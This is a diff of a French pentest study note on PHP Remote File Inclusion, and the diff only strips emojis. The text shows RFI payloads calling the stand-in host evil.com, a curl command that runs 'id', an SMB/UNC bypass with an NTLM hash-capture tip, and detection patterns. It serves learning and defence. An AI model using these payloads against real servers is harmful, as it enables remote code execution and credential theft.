@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🌐 RFI — Remote File Inclusion
+# RFI — Remote File Inclusion
 
 > [!info] **En 1 phrase**
 > RFI = amener le serveur à **inclure un fichier distant** qu'on contrôle via `include($url)` →
@@ -20,7 +20,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -32,7 +32,7 @@ flowchart LR
     B --> E
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Si `allow_url_include = On`, PHP fait `include("http://evil.com/shell.txt")` : le contenu
 > téléchargé est **interprété comme du PHP** → exécution de notre payload. Même si le serveur
 > attaquant sert le fichier en `text/plain`, seule la partie `<?php ... ?>` compte.
@@ -52,7 +52,7 @@ allow_url_fopen = On
 
 ---
 
-## 🚀 Payloads
+## Payloads
 
 ```url
 page=http://evil.com/shell.txt
@@ -74,12 +74,12 @@ python3 -m http.server 80
 # Puis : curl 'http://target/index.php?page=http://evil.com/shell.txt&c=id'
 ```
 
-> [!tip] 💡 Même si le serveur de l'attaquant sert le `.txt` en `text/plain`, PHP l'inclut et
+> [!tip] Même si le serveur de l'attaquant sert le `.txt` en `text/plain`, PHP l'inclut et
 > l'interprète : seule la partie `<?php ... ?>` compte pour le moteur.
 
 ---
 
-## 🪟 Bypass `allow_url_include = Off` — partage SMB (Windows)
+## Bypass `allow_url_include = Off` — partage SMB (Windows)
 
 > Même avec `allow_url_include` **et** `allow_url_fopen` désactivés, un include distant marche
 > sur une cible Windows via le protocole **smb** : `\\IP\share\shell.php`.
@@ -94,12 +94,12 @@ python3 -m http.server 80
 page=\\10.0.0.1\share\shell.php
 ```
 
-> [!tip] 💡 **Bonus NTLM capture** : un UNC path peut aussi forcer le serveur à
+> [!tip] **Bonus NTLM capture** : un UNC path peut aussi forcer le serveur à
 > **s'authentifier** sur notre partage → capture de hashes **NTLM** (relay/offline).
 
 ---
 
-## ⚔️ LFI vs RFI — rappel
+## LFI vs RFI — rappel
 
 | Critère | LFI | RFI |
 |---|---|---|
@@ -111,7 +111,7 @@ page=\\10.0.0.1\share\shell.php
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -121,29 +121,29 @@ page=\\10.0.0.1\share\shell.php
 | **Canonicalisation** | `realpath()` + vérifier que le résultat **commence par** le dossier autorisé |
 | **Surveillance** | Logs des patterns `http://`, `data://`, `\\`, `evil.com` dans les requêtes |
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!warning] ⚠️ **`allow_url_include = Off` par défaut**
+> [!warning] `allow_url_include = Off` par défaut**
 > RFI échoue sur la plupart des cibles modernes. Tester d'abord : `data://`, `php://input`,
-> ou basculer sur [[LFI - Local File Inclusion|📂 LFI]] (wrappers + log poisoning) qui ne dépendent pas de cette option.
+> ou basculer sur [[LFI - Local File Inclusion| LFI]] (wrappers + log poisoning) qui ne dépendent pas de cette option.
 
-> [!tip] 💡 **Windows + SMB : le bypass sans `allow_url_include`**
+> [!tip] **Windows + SMB : le bypass sans `allow_url_include`**
 > Le partage **SMB/UNC** (`\\IP\share\shell.php`) fonctionne sur Windows même avec
 > `allow_url_include` et `allow_url_fopen` désactivés.
 
-> [!tip] 💡 **Le `%00` (null byte)**
+> [!tip] **Le `%00` (null byte)**
 > Utile si l'app concatène une extension (`shell.txt.php`). Ne marche que sur **PHP < 5.3.4**.
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger — File inclusion : https://portswigger.net/web-security/all-labs#file-inclusion
 - Root-Me — RFI : https://www.root-me.org/
 
 ---
 
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > - [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
 
-➡️ **Liens :** [[LFI et RFI|📂 Hub LFI/RFI]] · [[LFI - Local File Inclusion|📂 LFI]] · [[Path Traversal|🛣️ Path Traversal]] · [[Injection de commandes|🐚 Injection de commandes]] · [[03 - Exploitation Web|🌍 Exploitation Web]] · [[Bibliothèque technique|🏠 Index]]
+**Liens :** [[LFI et RFI| Hub LFI/RFI]] · [[LFI - Local File Inclusion| LFI]] · [[Path Traversal| Path Traversal]] · [[Injection de commandes| Injection de commandes]] · [[03 - Exploitation Web| Exploitation Web]] · [[Bibliothèque technique| Index]]
